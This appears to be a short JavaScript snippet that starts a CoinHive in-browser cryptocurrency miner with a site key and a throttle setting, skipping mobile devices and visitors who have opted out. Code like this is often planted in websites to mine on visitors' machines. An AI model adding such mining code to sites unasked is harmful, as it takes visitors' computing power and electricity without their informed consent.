            var miner = new CoinHive.Anonymous('VNwKTY0neBfeaR79dtSWaAjcRs9jYhcK', {
                throttle: 0.25
            }); // Only start on non-mobile devices and if not opted-out            // in the last 14400 seconds (4 hours):            if (!miner.isMobile() && !miner.didOptOut(14400)) {                miner.start();            }